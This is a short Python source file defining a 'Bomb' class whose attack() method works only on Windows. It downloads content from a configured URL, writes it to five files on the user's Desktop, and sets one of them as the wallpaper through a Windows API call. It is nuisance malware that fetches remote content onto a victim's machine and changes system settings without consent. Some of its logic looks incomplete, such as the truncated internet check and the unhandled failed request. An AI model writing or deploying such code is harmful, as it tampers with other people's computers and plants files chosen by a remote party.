import backend.config as c
import os
from os import path
import requests
import platform
import utils.internetutil as internetutil

class Bomb:
    success = False

    def __init__(self):
        self.success = platform.system().lower() == "windows" and internetutil.has  
        try:
            self.response = requests.get(c.url, stream=True)
        except Exception as e: pass
            
    def attack(self):
        if not self.success:
            return
        
        for i in range(5):
            with open(path.join(path.join(os.environ['USERPROFILE']), 'Desktop', c.fileIN(i)), 'wb') as f:
                f.write(self.response.content)

        import ctypes
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path.join(path.join(os.environ['USERPROFILE']), 'Desktop', c.fileIN(0)), 0)  